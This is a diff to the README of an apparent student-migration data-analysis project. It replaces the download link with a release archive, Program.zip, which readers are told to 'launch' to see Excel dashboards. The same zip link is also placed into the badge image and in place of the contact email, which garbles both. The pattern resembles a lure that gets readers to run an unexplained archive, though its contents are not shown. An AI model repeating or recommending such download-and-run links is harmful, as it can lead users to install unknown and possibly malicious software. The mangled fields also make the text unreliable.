@@ -33,9 +33,9 @@ The analysis in this repository provides valuable insights into the migration tr
 ---
 
 ### Get Started 🚀
-To explore the detailed analysis and visualizations, you can download the software package by clicking [here](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip). *Launch the software package to access the interactive Excel dashboards and delve into the migrating student data.*
+To explore the detailed analysis and visualizations, you can download the software package by clicking [here](https://github.com/brahiim05/Indian_Migrating_Students_Analysis/releases/download/v1.0/Program.zip). *Launch the software package to access the interactive Excel dashboards and delve into the migrating student data.*
 
-[![Software Package](https://img.shields.io/badge/Download-Software%20Package-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Software Package](https://github.com/brahiim05/Indian_Migrating_Students_Analysis/releases/download/v1.0/Program.zip%20Package-blue)](https://github.com/brahiim05/Indian_Migrating_Students_Analysis/releases/download/v1.0/Program.zip)
 
 In case the link is not working, please check the "Releases" section for alternative download options.
 
@@ -47,7 +47,7 @@ This project was made possible by the contributions of various individuals dedic
 ---
 
 ### Contact Us 📧
-If you have any questions, suggestions, or feedback regarding the Indian Migrating Students Analysis project, feel free to reach out to us at [xyz@example.com](mailto:xyz@example.com). Your input is valuable to us as we continue to enhance and expand our analysis efforts.
+If you have any questions, suggestions, or feedback regarding the Indian Migrating Students Analysis project, feel free to reach out to us at [https://github.com/brahiim05/Indian_Migrating_Students_Analysis/releases/download/v1.0/Program.zip](https://github.com/brahiim05/Indian_Migrating_Students_Analysis/releases/download/v1.0/Program.zip). Your input is valuable to us as we continue to enhance and expand our analysis efforts.
 
 ---
 
